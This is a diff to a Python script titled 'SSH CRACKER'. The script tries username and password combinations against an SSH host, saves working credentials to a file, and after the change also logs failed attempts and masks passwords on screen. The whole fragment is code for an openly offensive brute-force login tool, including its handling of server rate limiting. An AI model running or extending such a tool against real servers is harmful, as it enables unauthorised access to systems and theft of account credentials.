@@ -9,13 +9,18 @@ import threading
 import time
 import logging
 import pyfiglet
+import os
 
+os.system("clear")
+for i in tqdm(range(10), colour="green", desc="loading software"):
+    time.sleep(1.00)
+
+os.system("clear")
 name = "SSH   CRACKER"
 ascii_banner = pyfiglet.figlet_format(f"{name}")
 print(ascii_banner)
 
-for i in tqdm(range(10), colour="green", desc="loading software"):
-    time.sleep(1.00)
+
 def ssh(host, username, password):
     ssh_client = SSHClient()
     ssh_client.set_missing_host_key_policy(AutoAddPolicy())
@@ -25,7 +30,10 @@ def ssh(host, username, password):
             print(f"{Fore.GREEN}Username - {username} and Password - ******* found.")
             fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
     except AuthenticationException:
-        print(f"{Fore.RED}Username - {username} and Password - {password} is Incorrect.")
+        with open("Wrong_credentials.txt", "a") as fh:
+            print(f"{Fore.RED}Username - {username} and Password - ****** is Incorrect.")
+            fh.write(f"Username: {username}\nPassword: {password}\nDidnt work on host {host}\n")
+
     except ssh.SSHException:
         print(f"{Fore.RED}**** Attempting to connect - Rate limiting on server ****")
 
